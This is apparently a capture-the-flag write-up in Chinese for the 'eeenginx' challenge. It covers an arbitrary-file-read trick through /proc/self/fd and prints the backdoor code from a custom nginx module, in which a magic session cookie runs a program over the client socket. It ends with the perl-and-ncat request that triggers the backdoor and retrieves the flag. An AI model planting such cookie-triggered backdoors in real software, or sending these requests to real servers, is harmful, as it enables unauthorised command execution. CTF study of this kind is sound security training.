# eeenginx 

就是一個任意下載的題目

各種常見的招 `/proc/self/fd/*`

可以讀到 error log 等資訊

其中可以發現 access log 在 `/work/logs/access.log` 

裡頭可以看到應該是其他隊讀檔紀錄:

- /opt/module/ngx_http_eeenginx.c
- /opt/module/eeenginx.h
- /opt/module/eeenginx.c

比較關鍵的片段：

```
int exec_shell(int fd)
{
    int pid;
    pid = fork();
    if(pid>0){
        close(fd);
        exit(0);
    }

    dup2(fd,0);
    dup2(fd,1);
    dup2(fd,2);
    execve("/readflag", NULL, NULL);
    return 0;
}
```

```
     if(r->headers_in.cookies.nelts==1){
         if(strncmp((char *)cookies[0]->value.data,"session=eeenginx97826431357894989;", sizeof("session=eeenginx97826431357894989"))==0){
             // msend(cmd_fd, "eeenginx1", sizeof("eeenginx1"));
             exec_shell(cmd_fd);
         }
     }
```

照著送就能拿到flag:

```
$ perl -e 'print "GET / HTTP/1.1\r\nHost: 118.195.199.18:12345\r\nCookie:session=eeenginx97826431357894989;\r\n\r\n"' | ncat 118.195.199.18 12345
flag{thanks_to_tm3yshell7}
```

